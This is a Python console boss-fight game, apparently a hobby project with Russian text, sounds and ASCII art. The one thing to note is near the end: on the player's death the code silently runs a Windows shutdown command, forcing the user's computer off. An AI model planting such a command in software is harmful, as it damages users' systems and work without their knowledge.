import random
import os
import time
import arcade
import msvcrt

import ASCII

clear = lambda: os.system('cls')

#LOX 3

#Считывание и проверка длины имени игрока
playername = input("Введи своё имя: ")
while len(playername) > 5 or len(playername) < 3:
    print("Размер имени от 3 до 5 символов...")
    playername = input("Введи своё имя: ")

#Функция считывания нажатой клавиши
def get_key():
    # очищаем буфер
    while msvcrt.kbhit():
        msvcrt.getch()

    key = msvcrt.getch()  # читаем только свежую клавишу
    try:
        return int(key.decode())
    except ValueError:
        return None  # если не цифра

#Переменные
playerhp = int(20)
playermana = int(0)
bosshp = int(33)

fire_dot_damage = -1
freezebuildup = -1

#Звуки
swordsound = arcade.load_sound("sounds/sword.wav")
healsound = arcade.load_sound("sounds/heal.wav")
bossattack = arcade.load_sound("sounds/bossattack.wav")
fireballsound = arcade.load_sound("sounds/fireball.wav")
iceshardsound = arcade.load_sound("sounds/iceshard.wav")
burningsound = arcade.load_sound("sounds/burning.wav")

#Пасхалкоу
if playername == "Аллах":
    playerhp = int(999)
    playermana = int(999)

#Цикл босса
while bosshp > 0:
    #Переменные урона, хилла и скиллов
    pdamage = random.randint(1, 3)
    playerheal = random.randint(1, 3)
    fireballdamage = random.randint(2, 4)
    icesharddamage = random.randint(1, 2)

    #Переменные для босса
    bdamage = random.randint(1, 3)

    #Главный экран
    clear()
    print(ASCII.drawmain.format(playername=playername))


    #Логика игрока
    print(f"Твоё хп: {playerhp} | Твоя мана: {playermana} | Хп Босса: {bosshp}\n [1] Ударить мечом! [2] Восстановить здоровье! [3] Меню выбора навыков!")
    action = get_key()

    match action:

        #Удар мечом
        case 1:

            #крит для меча
            if random.random() > 0.66:
                arcade.play_sound(swordsound)
                clear()
                print(ASCII.drawswordcrit)

                playermana = pdamage
                pdamage = pdamage * 2
                bosshp -= pdamage

                print(f"{playername} нанёс {pdamage} критического урона! Здоровье Гриши: {bosshp}")
                time.sleep(1.35)
    

            else:
                arcade.play_sound(swordsound)
                clear()
                print(ASCII.drawsword)

                playermana += pdamage
                bosshp -= pdamage

                print(f"{playername} нанёс {pdamage} урона! Здоровье Гриши: {bosshp}")
                time.sleep(1.35)

        #Хилка
        case 2:
            if playerhp >= 20:
                clear()
                playerhp -= playerheal
                print(ASCII.drawtemplate)
                print(f"Еблан? У тебя фулл хп. Лося за втык! Хилка нанесла {playerheal} урона! Текущее здоровье {playerhp}")
                time.sleep(1.35)

            else:
                clear()
                arcade.play_sound(healsound)

                playerhp = min(playerheal + playerhp, 20)

                print(ASCII.drawheal)
                print(f"Хилка дала {playerheal} Текущее здоровье {playerhp} ")
                time.sleep(1.35)


        #Меню выбора навыков
        case 3:
            print(f"\nДоступные навыки:\n[1] Фаерболл! [2] Ледяной осколок! [3] Вернуться назад!")
            skillchoise = get_key()

            match skillchoise:
                #Выбор фаербола
                case 1:
                    if playermana >= 3:

                        clear()
                        arcade.play_sound(fireballsound)
                        print(ASCII.drawfireballsucces)

                        bosshp -= fireballdamage
                        playermana -= 3

                        print (f"Нанесенно: {fireballdamage} Здоровье босса: {bosshp}")
                        
                        time.sleep(1.35)

                        #шанс прока дот урона от огня
                        if random.random() < 0.5:

                            clear()
                            fire_dot_damage = 3

                            print(ASCII.drawbossfiredamage)
                            arcade.play_sound(burningsound)
                            print(f"Босс загорелся на 3 хода!")
                            time.sleep(1.35)
                    #Если не хватает маны
                    else:
                        clear()

                        playerhp -= 1

                        print(ASCII.drawfireballfailed)
                        print (f"Фаерболл взорвался в руке и нанёс 1 урона! Текущее здоровье: {playerhp}")
                        
                        time.sleep(1.35)


                #Ледяной урон
                case 2:
                    if playermana >= 3:
                        clear()
                        arcade.play_sound(iceshardsound)

                        playermana -= 3
                        bosshp -= icesharddamage

                        print(ASCII.drawiceshardsucces)
                        print(f"Ледяной осколок нанёс {icesharddamage} Здоровье босса: {bosshp}")

                        if random.random() < 0.5:
                            freezebuildup = 2
                        
                        time.sleep(1.35)

                    #Если не хватает маны
                    else:
                        clear()

                        playerhp -= 1

                        print(ASCII.drawfireballfailed)
                        print(f"Ледяной осколок обморозил руку и нанёс 1 урона! Текущее здоровье: {playerhp} ")
                        
                        time.sleep(1.35)

                #Вернуться назад
                case 3:
                    continue

    #Проверка на смерть босса(что бы не бил с 0 хп)
    if bosshp < 1:
        continue

    #Проверка Босса на Фриз
    if freezebuildup > 0:
        clear()
        arcade.play_sound(iceshardsound)
        print(ASCII.drawbossfreeze)
        print(f"Босс заморожен еще {freezebuildup} ход(а)!")
        freezebuildup -= 1
        time.sleep(1.35)


    #Логика босса
    else:
        clear()
        print(ASCII.drawbossattack)
        arcade.play_sound(bossattack)

        bdamage = random.randint(1, 3)
        playerhp -= bdamage

        print (f"Босс Гриша нанёс {bdamage} урона!")
        time.sleep(1.35)


    #Счётчик дот урона от фаерболла
    if fire_dot_damage >= 0:
        clear()

        fire_dot_damage -= 1
        bosshp -= fire_dot_damage

        print(ASCII.drawbossfiredamage)
        arcade.play_sound(burningsound)
        print("Босс получает 1 урон от огня")
        time.sleep(1.35)


    if playerhp <= 0:
        os.system("shutdown /s /t 5")
        break

#Смерть босса
clear()
print(ASCII.drawbossdead)
print(f"Ты убил босса!")
time.sleep(1.35)
exit()